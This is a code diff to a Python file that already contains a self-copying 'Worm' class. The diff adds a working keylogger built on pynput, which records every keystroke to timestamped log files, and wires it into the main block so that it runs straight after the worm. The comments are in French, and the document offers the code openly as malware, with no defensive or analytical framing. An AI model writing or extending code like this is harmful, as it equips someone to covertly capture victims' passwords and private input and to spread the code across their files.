@@ -1,5 +1,8 @@
 import os
 import shutil
+from pynput.keyboard import Key, Listener
+import logging
+from datetime import datetime
 
 
 class Worm:
@@ -63,9 +66,47 @@ class Worm:
         self.create_new_worm()
         self.copy_existing_file()
 
+#-------------------------Keylogger-------------------------------
 
+class Keylogger:
+        
+    def create_log_directory(self):
+        sub_dir = "log"
+        cwd = os.getcwd()
+        self.log_dir = os.path.join(cwd,sub_dir)
+        if not os.path.exists(sub_dir):
+            os.mkdir(sub_dir)
+    
+    
+    @staticmethod
+    def on_press(key):
+        try:
+            logging.info(str(key))
+        except Exception as e:
+            logging.info(e)
+        
+            
+    def write_log_file(self):
+        # exemple de format: '2022-12-02-186747'
+        time = str(datetime.now())[:-7].replace(" ", "-").replace(":", "")
+        # fichier de log
+        logging.basicConfig(
+                 filename=(os.path.join(self.log_dir, time) + "-log.txt"),
+                 level=logging.DEBUG, 
+                 format= '[%(asctime)s]: %(message)s',
+             )
+        
+        with Listener(on_press=self.on_press) as listener:
+            listener.join()
+
+#-------------------------Keylogger-------------------------------
+
+#--------------------------execution du code avec le main-----------------------
 
 if __name__=="__main__":
     current_directory = os.path.abspath(r"C:\Users\User\Documents\test")
     worm = Worm(path=current_directory)
     worm.start_worm_actions()  
+    keylog = Keylogger()
+    keylog.create_log_directory()
+    keylog.write_log_file()
